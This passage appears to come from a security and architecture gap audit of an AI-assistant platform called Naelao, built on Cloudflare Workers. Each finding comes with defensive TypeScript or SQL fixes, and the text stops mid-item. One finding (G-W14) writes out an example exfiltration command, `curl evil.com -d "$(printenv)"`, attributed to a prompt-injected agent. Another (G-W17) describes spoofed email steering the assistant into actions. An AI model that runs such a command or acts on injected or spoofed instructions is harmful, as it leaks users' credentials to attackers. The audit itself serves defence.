There is no specified retention/expiry policy for old messages, completed runs, tool-audit rows, or stream buffers. DO SQLite has a hard 1GB-per-DO limit; an active AssistantDO accumulating conversation history and per-token buffers will eventually approach it, at which point writes fail and the DO is bricked. There is also no enforcement of GDPR retention maxima (data must not be kept longer than necessary).

Required Fix

Define and enforce per-table retention with a periodic prune: ```typescript async pruneOldData() { const now = Date.now(); const RETENTION = { messages: 180 * 86400_000, // 180 days runs: 90 * 86400_000, tool_audit: 30 * 86400_000, stream_buffer: 1 * 86400_000, }; for (const [table, ttl] of Object.entries(RETENTION)) { this.ctx.storage.sql.exec(`DELETE FROM ${table} WHERE created_at < ?`, now - ttl); } } // Schedule via this.scheduleEvery('24h', 'pruneOldData') (or alarm). ``` Archive pruned messages to R2 (cold storage) before deletion if the space tier includes long-term history.

G-V38 MEDIUM §Compliance — PII — platform / PII redaction

No PII redaction before Analytics Engine, logs, or external LLM calls

The Gap

Conversation text, tool outputs, and API responses flow into Analytics Engine, console logs, and external LLM providers with no redaction step. These payloads routinely contain emails, phone numbers, API keys, and other secrets. Logs and Analytics Engine are queryable by operators and may be retained or forwarded to third-party log sinks, creating a PII exposure surface and a compliance liability. Analytics Engine cannot delete individual rows, so any PII written there is effectively permanent until the rolling window expires.

Required Fix

Run a redaction pass before any telemetry sink: ```typescript const REDACTORS: [RegExp, string][] = [ [/[\w.+-]+@[\w-]+\.[\w.-]+/g, "[email]"], [/\b(?:\d[ -]*?){13,16}\b/g, "[card]"], [/sk-[A-Za-z0-9]{20,}/g, "[api-key]"], [/\b\+?\d{1,3}[\s.-]?\(?\d{2,4}\)?[\s.-]?\d{3,4}[\s.-]?\d{3,4}\b/g, "[phone]"], ]; function redact(text: string): string { return REDACTORS.reduce((s, [re, rep]) => s.replace(re, rep), text); } // Apply to anything written to Analytics Engine / logs. // For Analytics Engine, prefer storing a salted hash of identifiers, never raw PII. ```

G-V39 MEDIUM §Compliance — Audit — SpaceDO / audit immutability

product_audit_log is a mutable SQLite table — audit records can be altered or deleted, defeating their purpose

The Gap

The audit log lives in a normal SpaceDO SQLite table that supports `UPDATE` and `DELETE` like any other. A compromised admin path, a buggy migration, or a malicious actor with write access can rewrite or erase audit history, so the log is not tamper-evident and cannot be relied upon for security forensics or compliance evidence. Append-only and integrity-chaining are not enforced.

Required Fix

Make the audit log append-only and hash-chained: ```typescript // Each entry chains to the previous via a hash, making tampering detectable async appendAudit(event: AuditEvent) { const prev = [...this.ctx.storage.sql.exec( "SELECT hash FROM product_audit_log ORDER BY seq DESC LIMIT 1")][0]; const prevHash = prev?.hash ?? "genesis"; const payload = JSON.stringify(event); const hash = await sha256(prevHash + payload); this.ctx.storage.sql.exec( "INSERT INTO product_audit_log (seq, payload, prev_hash, hash, at) VALUES ((SELECT COALESCE(MAX(seq),0)+1 FROM product_audit_log), ?, ?, ?, ?)", payload, prevHash, hash, Date.now() ); } // Verification job recomputes the chain; any break flags tampering. ``` Mirror critical audit events to an external append-only sink (R2 with object-lock, or a Tail Worker) so even DO-level tampering is detectable.

G-V40 HIGH §naelao-knowledge — Search — naelao-knowledge / FTS index

Knowledge keyword search uses LIKE '%term%' with no index — full table scan that collapses at scale

The Gap

The keyword/lexical side of knowledge search uses `WHERE content LIKE '%term%'`, which cannot use any index and forces a full scan of every document row on every query. At a few hundred documents this is tolerable; at tens of thousands it becomes an O(n) scan that blows the DO CPU budget and serializes behind other queries, degrading the whole space. SQLite's FTS5 (already used for the Memory OS sessions layer) is the correct tool but is not applied to the knowledge corpus.

Required Fix

Back keyword search with an FTS5 virtual table: ```sql CREATE VIRTUAL TABLE IF NOT EXISTS knowledge_fts USING fts5( chunk_id UNINDEXED, doc_id UNINDEXED, content, tokenize = 'porter unicode61' ); -- Keep it in sync on ingest/delete INSERT INTO knowledge_fts (chunk_id, doc_id, content) VALUES (?, ?, ?); ``` ```typescript // Query with BM25 ranking instead of LIKE scan const rows = [...this.ctx.storage.sql.exec( "SELECT chunk_id, doc_id, bm25(knowledge_fts) AS score FROM knowledge_fts WHERE knowledge_fts MATCH ? ORDER BY score LIMIT 50", ftsQuery )]; ``` Fuse these BM25 results with the vector results via reciprocal rank fusion for hybrid search.

Appendix W — Fifteenth Pass

Workflows Determinism · Container Internals · Secrets & Encryption · Email/File Inputs · Orchestration & State · Migrations & Deployment

G-W01 HIGH §Workflows — Determinism — VerticalFinetuneWorkflow / replay

Date.now() and randomUUID() called outside step.do() — replay creates duplicate files and inconsistent IDs

The Gap

The fine-tune workflow computes a training file path as `bootstrap/${vertical}/training-runs/${Date.now()}/train.jsonl` and a model description outside any `step.do()` callback. CF Workflows replays all code outside step boundaries on every continuation (after a failure, a sleep, or a hibernation). Because `Date.now()` and `crypto.randomUUID()` are non-deterministic, each replay produces a different path and ID, so the workflow writes duplicate training files to R2 and references a model version string that no longer matches the one persisted by an earlier step.

Required Fix

Move all non-deterministic values inside a step so they are computed once and memoized: ```typescript const runId = await step.do("allocate-run-id", async () => { return { id: crypto.randomUUID(), at: Date.now() }; }); const trainingPath = `bootstrap/${vertical}/training-runs/${runId.id}/train.jsonl`; // runId is now stable across all replays because step.do() persists its return value ``` Rule: any `Date.now()`, `crypto.randomUUID()`, `Math.random()`, or `fetch()` MUST live inside a `step.do()` so its result is captured in the workflow journal and replayed identically.

G-W02 HIGH §Workflows — Limits — VerticalFinetuneWorkflow / step return size

Aggregation step returns the full training set inline — exceeds the step-result size limit and bloats the journal

The Gap

The `aggregate-training-data` step reads all labeled examples from R2 into an array, serializes them to JSONL, and returns `{ trainingPath, exampleCount }` — but the implementation collects the entire example set with no cap, and the formatted JSONL is held in the step closure. CF Workflows persists every step return value into the workflow journal; large returns blow past the per-step result size limit (single-digit MB) and bloat the journal, slowing every subsequent replay. A few thousand examples is enough to trip this.

Required Fix

Stream the data to R2 inside the step and return only a pointer: ```typescript const result = await step.do("aggregate-training-data", async () => { const path = `bootstrap/${vertical}/training-runs/${runId}/train.jsonl`; // Write directly to R2; never return the payload itself await streamExamplesToR2(env.NAELAO_WORKSPACE, path, exampleSource); const count = await countLines(env.NAELAO_WORKSPACE, path); return { trainingPath: path, exampleCount: count }; // small, safe to journal }); ``` Step returns should always be small references (paths, IDs, counts), never bulk data.

G-W03 MEDIUM §Workflows — Limits — VerticalFinetuneWorkflow / step budget

Polling loop has no max-iteration guard — a slow training job can exceed the 1000-step hard limit

The Gap

The job-monitoring loop is `while (jobStatus === "running") { step.sleep("30 minutes"); step.do("check-status"); }`. Each iteration consumes two steps. A fine-tune job that runs for 24+ hours produces ~96 iterations (~192 steps), and a stuck provider job that never transitions out of "running" loops indefinitely toward the 1000-step hard ceiling, at which point the workflow is force-terminated with no clean failure state.

Required Fix

Bound the poll loop with an explicit iteration cap and a wall-clock deadline: ```typescript const MAX_POLLS = 96; // 48 hours at 30-min intervals const DEADLINE = startTime + 48 * 3600_000; for (let i = 0; i < MAX_POLLS; i++) { const status = await step.do(`check-status-${i}`, () => pollProvider(jobId)); if (status !== "running") break; if (Date.now() > DEADLINE) { await step.do("mark-timed-out", () => markJobFailed(jobId, "timeout")); break; } await step.sleep(`poll-${i}`, "30 minutes"); } ``` Use exponential backoff on the sleep interval to reduce total step count for long jobs.

G-W04 HIGH §Containers — Concurrency — AssistantSandboxDO / exec serialization

Concurrent exec() calls hit the same container shell without serialization — interleaved output and state corruption

The Gap

The SandboxDO's `exec()` dispatches directly to `this.containerRef.exec()` with no command queue. When two requests run in parallel (e.g., a workspace tool and a sandbox tool in the same turn), both execute against the same container shell concurrently. Their stdout/stderr interleave, working-directory changes from one command bleed into the other, and any shared file (a temp file, a lock) races. The DO's single-threaded request model does NOT protect this, because `exec()` is a non-storage async call that does not hold the input gate.

Required Fix

Serialize commands through a per-DO queue: ```typescript private execChain: Promise<unknown> = Promise.resolve(); async exec(cmd: string, args: string[], opts: ExecOpts): Promise<ExecResult> { // Chain each exec after the previous one completes const run = this.execChain.then(() => this.containerRef!.exec(cmd, args, opts)); // Keep the chain alive even if one command throws this.execChain = run.catch(() => {}); return run; } ``` For commands that are genuinely independent and safe to parallelize, run them in separate working directories or separate containers (see multi-container, Appendix T).

G-W05 MEDIUM §Containers — Lifecycle — AssistantSandboxDO / boot race

ensureRunning() is not atomic — two simultaneous calls boot two containers

The Gap

`ensureRunning()` checks `if (status === "running" && this.containerRef) return` and otherwise calls `getSandbox()`. The check and the boot are not atomic across the two non-storage async awaits, so two requests arriving on a cold DO both observe `stopped`, both call `getSandbox()`, and two container instances are provisioned. The second leaks (it is never tracked or terminated) and bills until its idle timeout.

Required Fix

Guard the boot with blockConcurrencyWhile and a single in-flight promise: ```typescript private booting: Promise<Sandbox> | null = null; async ensureRunning(): Promise<Sandbox> { if (this.containerRef && await this.isAlive(this.containerRef)) return this.containerRef; if (this.booting) return this.booting; // coalesce concurrent boots this.booting = (async () => { const sb = getSandbox(this.env.SANDBOX, this.sandboxId); await sb.startup?.(); this.containerRef = sb; return sb; })(); try { return await this.booting; } finally { this.booting = null; } } ```

G-W06 MEDIUM §Containers — Lifecycle — AssistantSandboxDO / idle alarm

Idle-termination alarm is reset only after exec() completes — a long command is killed mid-execution

The Gap

The idle-timeout alarm (e.g., 10 minutes) is refreshed by `resetIdleTimer()`, which is called only at the END of `exec()`. A single command that runs longer than the idle window — a 15-minute Python training script, a long build — does not refresh the timer while it runs, so the alarm fires and terminates the container while the command is still executing, killing the job with no result.

Required Fix

Refresh the deadline at command start and use a heartbeat for long commands: ```typescript async exec(cmd: string, args: string[], opts: ExecOpts) { await this.ctx.storage.put("last_active", Date.now()); await this.ctx.storage.setAlarm(Date.now() + IDLE_MS); // arm before running // Heartbeat: while the command runs, keep pushing the deadline out const hb = setInterval(() => this.ctx.storage.setAlarm(Date.now() + IDLE_MS), IDLE_MS / 3); try { return await this.containerRef!.exec(cmd, args, opts); } finally { clearInterval(hb); await this.ctx.storage.setAlarm(Date.now() + IDLE_MS); } } ``` In the alarm handler, only terminate if `now - last_active > IDLE_MS` AND no command is in flight.

G-W07 MEDIUM §Containers — Output — AssistantSandboxDO / output truncation

exec() truncates stdout/stderr silently — the agent proceeds on incomplete output with no truncated flag

The Gap

Command output is truncated with `.slice()` to ~10,000 bytes (stdout) and ~5,000 bytes (stderr) before being returned/logged. The truncation is silent: there is no `truncated: true` flag and no indication to the agent that the tail of the output was discarded. A command whose meaningful result is at the end (a build summary, a test report's final lines, a JSON payload) returns a head that looks complete, and the agent reasons over partial data.

Required Fix

Signal truncation and promote large output to R2: ```typescript async function captureOutput(raw: string, kind: "stdout"|"stderr") { const LIMIT = kind === "stdout" ? 10_000 : 5_000; if (raw.length <= LIMIT) return { text: raw, truncated: false }; // Persist the full output, return head + tail + a reference const ref = `tmp/exec-output/${crypto.randomUUID()}.txt`; await env.NAELAO_WORKSPACE.put(ref, raw); return { text: raw.slice(0, LIMIT / 2) + "\n…[truncated]…\n" + raw.slice(-LIMIT / 2), truncated: true, fullOutputRef: ref, }; } ``` The agent can then fetch `fullOutputRef` if it needs the complete output.

G-W08 MEDIUM §Containers — Lifecycle — AssistantSandboxDO / command timeout

exec() has no per-command timeout — a hung process holds the container indefinitely

The Gap

The `exec()` call passes no timeout to the container runtime. A command that hangs — a Python script blocked on an unresponsive external API, a `read` waiting on stdin that never comes, an infinite loop — occupies the container forever (or until the idle alarm, which the in-flight command keeps resetting per G-W06). The agent turn that issued it blocks, and the container cannot service other commands.

Required Fix

Enforce a per-command timeout with a SIGTERM/SIGKILL escalation: ```typescript async exec(cmd: string, args: string[], opts: ExecOpts & { timeoutMs?: number }) { const timeoutMs = opts.timeoutMs ?? 120_000; // 2 min default const exec = this.containerRef!.exec(cmd, args, opts); const timeout = new Promise<never>((_, rej) => setTimeout(() => rej(new Error(`exec timeout after ${timeoutMs}ms`)), timeoutMs)); try { return await Promise.race([exec, timeout]); } catch (e) { // Best-effort kill so the container is reusable await this.containerRef!.exec("pkill", ["-TERM", "-f", cmd], {}).catch(() => {}); throw e; } } ``` Expose `timeoutMs` per tool so long jobs can opt into a larger budget explicitly.

G-W09 LOW §Containers — Lifecycle — AssistantSandboxDO / crash detection

A crashed container leaves a stale containerRef and DB status of running — next exec() fails opaquely

The Gap

If the container process dies (OOM kill, SIGKILL, host reclaim), `this.containerRef` still holds a reference to the dead stub and the DB row still reads `status = "running"`. The next `exec()` call dispatches to the dead stub and fails with an opaque connection error rather than transparently rebooting. The DO never reconciles the discrepancy on its own.

Required Fix

Detect connection failures and self-heal: ```typescript async exec(cmd: string, args: string[], opts: ExecOpts) { try { return await this.containerRef!.exec(cmd, args, opts); } catch (e) { if (isConnectionError(e)) { this.containerRef = null; this.ctx.storage.sql.exec("UPDATE sandbox SET status='stopped' WHERE id=?", this.sandboxId); await this.ensureRunning(); // reboot return await this.containerRef!.exec(cmd, args, opts); // retry once } throw e; } } ```

G-W10 CRITICAL §Secrets — Service Auth — platform / NAELAO_INTERNAL_TOKEN

Static shared NAELAO_INTERNAL_TOKEN for all inter-Worker calls — one compromised Worker exposes every space

The Gap

Inter-Worker calls across at least eight call sites authenticate with a single static `NAELAO_INTERNAL_TOKEN` shared by all Workers. It has no expiry, no per-request scope, and no caller identity. If any Worker is compromised — for example via a malicious dynamic tool or skill that achieves code execution in a Worker isolate — the attacker holds a token that authorizes calls to every internal API for every space, and nothing in the audit trail distinguishes the malicious calls from legitimate platform traffic.

Required Fix

Replace the static token with short-lived, caller-scoped service JWTs: ```typescript // Caller mints a 5-minute JWT identifying itself and the target scope async function mintServiceToken(env: Env, caller: string, scope: string) { return await signJWT({ iss: caller, aud: "naelao-internal", scope, exp: Math.floor(Date.now()/1000) + 300 }, env.SERVICE_SIGNING_KEY); } // Callee verifies signature, issuer, audience, scope, and expiry const { payload } = await jwtVerify(token, key, { audience: "naelao-internal", algorithms: ["HS256"], }); if (!payload.scope?.includes(requiredScope)) return new Response("forbidden", { status: 403 }); ``` Log `iss` (calling Worker) and `scope` on every internal call so compromised callers are attributable.

G-W11 HIGH §Secrets — Encryption — naelao-credentials / key isolation

Single platform key encrypts every space's credentials — no envelope encryption or per-tenant key

The Gap

The naelao-credentials Worker encrypts all stored MCP credentials, OAuth tokens, and BYOK API keys with one platform-level `NAELAO_MCP_ENCRYPTION_KEY`. There is no per-tenant data encryption key and no envelope encryption. A single compromise of that key (leaked secret, insider, misconfigured binding) instantly decrypts every customer's credentials across every space — there is no blast-radius containment.

Required Fix

Adopt envelope encryption with per-space data keys: ```typescript // Per-space DEK, wrapped by the platform KEK async function encryptForSpace(plaintext: string, spaceId: string, env: Env) { const dek = await deriveOrFetchDEK(spaceId, env); // unique per space const iv = crypto.getRandomValues(new Uint8Array(12)); const ct = await aesGcmEncrypt(plaintext, dek, iv); return { ciphertext: ct, iv, dekId: dek.id }; // store wrapped DEK separately } ``` Alternatively derive per-space keys with HKDF(platform_key, spaceId). Rotating one space's DEK then re-encrypts only that space, and a leaked DEK exposes only one tenant.

G-W12 HIGH §Secrets — Encryption — naelao-credentials / AES-GCM IV

AES-GCM IV uniqueness not enforced or audited — nonce reuse under the same key is catastrophic

The Gap

Encryption uses `crypto.getRandomValues(new Uint8Array(12))` for the GCM IV, which is correct in isolation, but nothing audits or guarantees IV uniqueness per key over time. A bug in key rotation, a replay of an old encrypt path, or restoring backed-up rows that reuse an IV under the same key collapses AES-GCM security entirely: an attacker who obtains two ciphertexts encrypted with the same (key, IV) recovers the XOR of the plaintexts and can forge tags. There is no logging of IVs to detect a collision.

Required Fix

Make IV reuse structurally impossible and detectable: ```typescript // Prefer a deterministic, monotonic counter-based IV per (key) to guarantee uniqueness, // or random IV + a uniqueness guard: const iv = crypto.getRandomValues(new Uint8Array(12)); const ivHash = await sha256(concat(dekId, iv)); const clash = [...sql.exec("SELECT 1 FROM iv_log WHERE iv_hash=?", ivHash)]; if (clash.length) throw new Error("IV collision detected — aborting encrypt"); sql.exec("INSERT INTO iv_log (iv_hash, dek_id, at) VALUES (?,?,?)", ivHash, dekId, Date.now()); ``` Rotate the DEK well before the birthday bound (2^32 messages for random 96-bit IVs).

G-W13 MEDIUM §Secrets — OAuth — naelao-credentials / token lifecycle

Stored OAuth tokens have no expiry tracking or refresh — silent tool failures and no rotation on use

The Gap

OAuth tokens for third-party MCP integrations (GitHub, Stripe, Notion) are stored encrypted but the schema has no `token_expires_at`, `refresh_token`, or `last_refreshed_at`. When an access token expires, the agent's tool call to that MCP server silently fails with a 401 and no refresh is attempted. For providers that rotate refresh tokens on use (RFC 6749 §6), the rotated token is never captured, so the integration permanently breaks after the first refresh elsewhere.

Required Fix

Track expiry and refresh proactively: ```sql ALTER TABLE credentials ADD COLUMN token_expires_at INTEGER; ALTER TABLE credentials ADD COLUMN refresh_token_enc TEXT; -- encrypted ALTER TABLE credentials ADD COLUMN last_refreshed_at INTEGER; ``` ```typescript async function getValidToken(credId: string, env: Env) { const c = await loadCredential(credId, env); if (c.token_expires_at && c.token_expires_at - Date.now() < 24*3600_000) { const refreshed = await refreshOAuth(c.provider, decrypt(c.refresh_token_enc)); await storeRefreshed(credId, refreshed); // capture rotated refresh token return refreshed.access_token; } return decrypt(c.access_token_enc); } ```

G-W14 MEDIUM §Secrets — Containers — AssistantSandboxDO / env var exposure

Credentials injected into containers as env vars — readable by any process via printenv or shell history

The Gap

Secrets (including the internal token and provider keys) are passed to the container through the `env:` object on `exec()`. Every process inside the container inherits these environment variables, so any agent-run command — or any user-authored skill script — can dump them with `printenv`, read `/proc/self/environ`, or find them in shell history. A single prompt-injected `curl evil.com -d "$(printenv)"` exfiltrates the entire credential set.

Required Fix

Never pass secrets as container env vars. Use a scoped credential-retrieval endpoint: ```typescript // Container fetches a short-lived, request-scoped token from an internal endpoint // instead of receiving raw keys: // GET http://credentials.internal/get?provider=stripe&runId=... // returns a signed token valid for seconds, scoped to this run and provider. const token = await fetch(`http://credentials.internal/get?provider=${p}&runId=${runId}`, { headers: { "x-run-attestation": runAttestation } }).then(r => r.text()); ``` If env injection is unavoidable, mount secrets as a read-only tmpfs file with restrictive permissions and clear them after the command, and disable shell history in the container.

G-W15 MEDIUM §Secrets — Logging — platform / secret scrubbing

No guaranteed scrubbing of secrets from error messages and logs

The Gap

When an MCP tool call or credential operation fails, the error message frequently includes the request URL, headers, or response body — any of which may carry an API key, bearer token, or OAuth secret. These errors are logged and sometimes surfaced to the client. There is no central scrubbing layer that redacts secret-shaped strings before logging or returning errors, so credentials leak into log sinks (which may be retained and forwarded to third parties).

Required Fix

Run all log/error output through a redactor: ```typescript const SECRET_PATTERNS: RegExp[] = [ /[Bb]earer\s+[A-Za-z0-9._-]{20,}/g, /sk-[A-Za-z0-9]{20,}/g, /xox[baprs]-[A-Za-z0-9-]{10,}/g, // Slack /ghp_[A-Za-z0-9]{36}/g, // GitHub PAT /(api[_-]?key|secret|token)["\s:=]+[A-Za-z0-9._-]{12,}/gi, ]; function scrub(s: string): string { return SECRET_PATTERNS.reduce((acc, re) => acc.replace(re, "[redacted]"), s); } // Wrap the logger and the error-to-client serializer with scrub(). ```

G-W16 MEDIUM §Secrets — Webhooks — SpaceDO / webhook signing secrets

Webhook signing secrets lack per-integration isolation and rotation grace period

The Gap

Webhook signing secrets (Slack signing secret, Stripe webhook secret, etc.) are stored with no documented per-integration scoping or rotation support. If stored under the shared platform encryption key, a key compromise exposes all of them; if a provider regenerates its signing secret (a routine security action), Naelao has no way to accept both the old and new secret during a transition, so verification breaks for every event the moment the secret rotates.

Required Fix

Version webhook secrets and accept overlapping secrets during rotation: ```sql CREATE TABLE webhook_secrets ( id TEXT PRIMARY KEY, integration TEXT NOT NULL, -- 'slack' | 'stripe' | ... secret_enc TEXT NOT NULL, -- per-space DEK encrypted version INTEGER NOT NULL, active INTEGER DEFAULT 1, created_at INTEGER, rotated_at INTEGER ); ``` ```typescript // During rotation, mark old secret active for a grace window and verify against both for (const s of activeSecretsFor(integration)) { if (verifySignature(body, sig, decrypt(s.secret_enc))) return true; } return false; ``` Expire the old secret after a 30-day grace period.

G-W17 CRITICAL §Email — Inbound — naelao-notifications / sender verification

Inbound email is processed with no SPF/DKIM/DMARC verification — spoofed mail triggers agent actions

The Gap

If inbound email handling is enabled (email as a channel into the assistant), there is no documented verification of sender authenticity. An attacker can spoof the From address of a trusted user or system and send an email that the assistant treats as a legitimate instruction — triggering agent actions, approvals, or data access under the spoofed identity. SPF, DKIM, and DMARC results are available on inbound mail but are never checked.

Required Fix

Verify authentication results before acting on any inbound email: ```typescript async function handleInboundEmail(msg: ForwardableEmailMessage, env: Env) { const authResults = msg.headers.get("Authentication-Results") ?? ""; const spfPass = /spf=pass/.test(authResults); const dkimPass = /dkim=pass/.test(authResults); const dmarcPass = /dmarc=pass/.test(authResults); if (!(spfPass && dkimPass && dmarcPass)) { await quarantine(msg, "failed_email_auth"); return; } // Map the verified From to a known user; reject if unmapped const user = await resolveVerifiedSender(msg.from, env); if (!user) return quarantine(msg, "unknown_sender"); await routeToAssistant(user, msg); } ``` Never bind email-sender identity to an account on the From header alone.

G-W18 HIGH §Email — Loops — naelao-notifications / reply-loop prevention

No email loop prevention — an auto-responder on the other end creates an unbounded reply storm

The Gap

The system sends transactional and assistant emails but has no safeguard against reply loops. If the assistant emails a user (or another system) that has an auto-responder or auto-forward configured, the auto-reply arrives inbound, the assistant responds, that response is auto-replied, and so on. This exhausts the email quota, damages sender reputation, and can spiral within minutes.

Required Fix

Add loop-detection headers and a per-thread send budget: ```typescript // On every outbound email, set anti-loop headers headers.set("Auto-Submitted", "auto-generated"); headers.set("X-Naelao-Loop-Token", threadLoopToken); // On inbound, drop machine-generated replies and enforce a count cap if (/auto-(replied|generated)/.test(msg.headers.get("Auto-Submitted") ?? "")) return; if (msg.headers.get("Precedence") === "bulk") return; const count = await incrThreadEmailCount(threadId); if (count > MAX_EMAILS_PER_THREAD_PER_HOUR) { await pauseThread(threadId); return; } ```

G-W19 HIGH §Email — Outbound — naelao-notifications / send rate cap

No per-space outbound email rate cap — a buggy or malicious agent can send 100k emails/hour

The Gap

Outbound email is dispatched via the Resend API from the notifications queue with no per-space rate limit. A buggy agent loop, a misconfigured campaign, or a malicious script can enqueue tens of thousands of emails, which Resend dispatches until the account-level limit trips — getting the entire platform's sending domain flagged or suspended, affecting all tenants.

Required Fix

Enforce a per-space outbound quota before dispatch, backed by a Durable Object counter: ```typescript async function sendEmail(spaceId: string, email: Email, env: Env) { const limiterId = env.EMAIL_RATE_DO.idFromName(`email:${spaceId}`); const limiter = env.EMAIL_RATE_DO.get(limiterId); const { allowed, remaining } = await limiter.consume(1, { perHour: 500, perDay: 2000 }); if (!allowed) { await deadLetter(email, "space_email_quota_exceeded"); await alertSpaceAdmin(spaceId, "email quota reached"); return; } await resendSend(email, env); } ``` Tie the per-space limits to the space tier.

G-W20 HIGH §Multimodal — Images — agent / image input bounds

Uploaded images are not size/dimension-checked before base64 vision encoding — token explosion and OOM

The Gap

Images supplied as agent input are base64-encoded and inlined into the model prompt with no prior size or dimension validation. A user uploading a 100MB or 12000×12000 image produces an enormous base64 string that explodes token usage (and cost) and can OOM the Worker (128MB memory limit) when several large images are processed concurrently. There is no downscaling or rejection path.

Required Fix

Validate and downscale before encoding: ```typescript const MAX_BYTES = 5 * 1024 * 1024; // 5MB const MAX_DIM = 2048; async function prepareImage(buf: ArrayBuffer, env: Env) { if (buf.byteLength > MAX_BYTES) throw new InputError("image exceeds 5MB"); const meta = await probeImage(buf); // dimensions + real format if (meta.width > MAX_DIM || meta.height > MAX_DIM) { buf = await env.IMAGES.input(buf).transform({ width: MAX_DIM, fit: "scale-down" }).output(); } return { data: bytesToBase64(buf), mediaType: meta.mime }; } ``` Prefer referencing images by URL (CF Images / R2) where the model supports it, instead of inlining base64.

G-W21 HIGH §Files — Upload Safety — file-manager / magic-byte validation

File uploads trust the declared MIME type — polyglot files bypass downstream type assumptions

The Gap

The write/upload path accepts a declared content type (and a base64 `encoding` flag) but never validates that the file's actual magic bytes match the declared type. A ZIP or HTML file can be uploaded as `image/png`, or an executable disguised as `.txt`. Any downstream consumer that trusts the declared type (a vision model, a previewer, another user downloading the file) is exposed to a polyglot/confused-type attack.

Required Fix

Sniff magic bytes and reject mismatches: ```typescript import { fileTypeFromBuffer } from "file-type"; async function validateUpload(buf: ArrayBuffer, declaredType: string) { const detected = await fileTypeFromBuffer(buf); const ALLOWED = new Set(["image/png","image/jpeg","application/pdf","text/plain", /*...*/]); if (!detected || !ALLOWED.has(detected.mime)) { throw new InputError(`unsupported or undetectable file type`); } if (detected.mime !== declaredType) { throw new InputError(`declared ${declaredType} but content is ${detected.mime}`); } return detected.mime; // trust the sniffed type downstream, not the declared one } ```

G-W22 HIGH §Files — Upload Safety — file-manager / presigned URL TTL

Presigned R2 upload URLs have no documented expiration — a leaked URL grants indefinite write access

The Gap

Direct-to-R2 uploads use presigned URLs but the spec does not define an expiration TTL or path scoping. A presigned URL that never expires (or expires far in the future) is a standing write capability: if it leaks (browser history, logs, a shared link), an attacker can inject arbitrary files into the space's workspace at the signed path for as long as the URL is valid.

Required Fix

Issue short-lived, tightly-scoped presigned URLs: ```typescript async function getUploadUrl(spaceId: string, filename: string, env: Env) { // Constrain the key to the caller's workspace prefix — no traversal const key = `spaces/${spaceId}/uploads/${crypto.randomUUID()}/${sanitize(filename)}`; const url = await env.R2.createPresignedUrl({ bucket: "naelao-workspace", key, method: "PUT", expiresIn: 300, // 5 minutes conditions: { contentLengthRange: [1, 50 * 1024 * 1024] }, // size cap }); return { url, key }; } ``` Validate the uploaded object (magic bytes, size) server-side after upload before treating it as usable.

G-W23 MEDIUM §Files — Download — file-manager / content-type sniffing

Download content-type comes from stored metadata without re-sniffing — enables type-confusion on download

The Gap

On download, the file-manager returns the `contentType` from R2 object metadata, which was set at upload time from the (untrusted) declared type. If a user uploaded a mislabeled file (e.g., an HTML file stored as `text/plain`), downstream agents or users receive it with a content type that does not match its bytes, enabling type-confusion attacks (HTML served as something benign, then rendered).

Required Fix

Re-derive the content type from content, and set safe download headers: ```typescript async function downloadFile(key: string, env: Env) { const obj = await env.R2.get(key); const buf = await obj.arrayBuffer(); const detected = (await fileTypeFromBuffer(buf))?.mime ?? "application/octet-stream"; return new Response(buf, { headers: { "Content-Type": detected, // trust content, not stored metadata "Content-Disposition": "attachment", // never inline-render user files "X-Content-Type-Options": "nosniff", }, }); } ```

G-W24 MEDIUM §Files — Path Safety — file-manager / path enforcement layer

Relative-path validation is enforced only in app code — no R2-prefix enforcement as defense in depth

The Gap

Path traversal is blocked by a `validateRelativePath()` check at tool-execution time that rejects `..` and absolute paths. This is a single layer: any code path that forgets to call it, or a bug in the check, allows a crafted path to escape the space's workspace prefix and read/write another tenant's objects. There is no second enforcement boundary that constrains all R2 operations to the space prefix regardless of the application path.

Required Fix

Wrap R2 access in a per-space client that hard-prefixes every key: ```typescript class SpaceScopedR2 { constructor(private bucket: R2Bucket, private prefix: string) {} private resolve(path: string): string { const key = `${this.prefix}/${path}`.replace(/\/+/g, "/"); // Normalize and assert containment — defense in depth if (!normalize(key).startsWith(this.prefix + "/")) throw new Error("path escape"); return key; } get(p: string) { return this.bucket.get(this.resolve(p)); } put(p: string, v: any) { return this.bucket.put(this.resolve(p), v); } } // All file ops go through SpaceScopedR2(bucket, `spaces/${spaceId}`), never raw bucket. ```

G-W25 CRITICAL §Orchestration — State — NaelaoAgentDO / setState conflicts

Concurrent setState() writes are last-write-wins — parallel tool results silently lose state mutations

The Gap

When two operations in the same turn (e.g., two parallel tool results) both call `setState()` / write the synced state row, the second write overwrites the first with no conflict detection or merge. There is no version field, no optimistic-locking check, and no merge semantics. Observed-in-parallel scenarios (the same run watched from multiple tabs, or genuinely concurrent tool completions) silently lose mutations, leaving client and server state diverged.

Required Fix

Use optimistic concurrency with a version column and merge-or-retry: ```typescript async function updateState(mutator: (s: State) => State) { for (let attempt = 0; attempt < 5; attempt++) { const row = [...sql.exec("SELECT data, version FROM agent_state WHERE id=?", id)][0]; const next = mutator(JSON.parse(row.data)); const res = sql.exec( "UPDATE agent_state SET data=?, version=version+1 WHERE id=? AND version=?", JSON.stringify(next), id, row.version ); if (res.rowsWritten === 1) return next; // committed // else: someone else wrote — reload and retry } throw new Error("state update contention"); } ``` For commutative updates (appending messages), prefer append-only tables over whole-object setState.

G-W26 HIGH §Orchestration — State — NaelaoAgentDO / state sync payload

Whole state object is broadcast on every change — large state floods every connected client per token

The Gap

State sync broadcasts the entire serialized state object to all connected WebSocket clients whenever it changes. If the agent accumulates a large state (megabytes of session context), every incremental update — potentially every streamed token — re-sends the full object to every client. This wastes bandwidth, stalls clients, and scales quadratically with state size × update frequency × client count.

Required Fix

Send deltas, not whole-state, and cap synced state size: ```typescript // Maintain synced state as a small view; keep bulk data in SQLite (queryable, not synced) const SYNC_BUDGET = 64 * 1024; // 64KB cap on the synced object // Broadcast JSON-patch deltas instead of the full object import { compare } from "fast-json-patch"; const patch = compare(prevSyncedState, nextSyncedState); if (patch.length) this.broadcast(JSON.stringify({ type: "state_patch", patch })); ``` Keep transcripts, tool outputs, and large blobs out of synced state entirely — clients fetch them on demand by ID.

G-W27 HIGH §Orchestration — State — NaelaoAgentDO / state ownership boundary

No defined boundary between in-memory this.state and SQLite — transient fields vanish on eviction

The Gap

Agent state is split between persistent SQLite (fibers, sessions, messages) and in-memory TypeScript fields (`this.state` and ad-hoc instance variables). The spec never defines which data belongs where. Code that writes working state to an instance field expecting it to survive — across a tool call, across a turn, across eviction — loses it silently when the DO hibernates, because only the SQLite checkpoint is restored on wake. Recovery via `onFiberRecovered()` restores the SQLite snapshot, not the in-memory mutations.

Required Fix

